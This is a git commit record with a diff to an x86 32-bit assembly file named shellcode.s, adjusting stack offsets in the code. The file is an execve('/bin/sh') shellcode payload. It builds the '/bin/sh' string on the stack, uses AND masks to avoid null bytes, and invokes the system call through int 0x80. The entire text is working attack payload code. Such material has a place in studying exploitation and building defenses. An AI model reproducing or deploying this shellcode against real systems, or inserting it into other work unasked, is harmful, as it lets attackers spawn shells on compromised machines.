e577fbfaa73692b3a7f3fee33508fbd2d5c1f79f
Eric Herman <eric@freesa.org>
2016-10-09 18:30:29 +0200

    we are targeting x86 (32 bit)

--- shellcode.s
+++ shellcode.s
@@ -2,16 +2,16 @@
 
 .text
 _start:
-	subl	$32, %esp
+	subl	$20, %esp
 	xorl	%eax, %eax
-	movl	%eax, 8(%esp)
-	movl	$1852400175, 24(%esp)
-	movl	$0xF068732F, 28(%esp)
-	andl	$0x0F68732F, 28(%esp)
+	movl	%eax, 4(%esp)
+	movl	$1852400175, 12(%esp)
+	movl	$0xF068732F, 16(%esp)
+	andl	$0x0F68732F, 16(%esp)
 	xorl	%edx, %edx
-	leal	24(%esp), %ebx
-	movl	%ebx, 16(%esp)
-	leal    16(%esp), %ecx
+	leal	12(%esp), %ebx
+	movl	%ebx, 8(%esp)
+	leal    4(%esp), %ecx
 	movl	$0xF0F0F00B, %eax
 	andl	$0x0F0F0FFF, %eax
 	int	$0x80
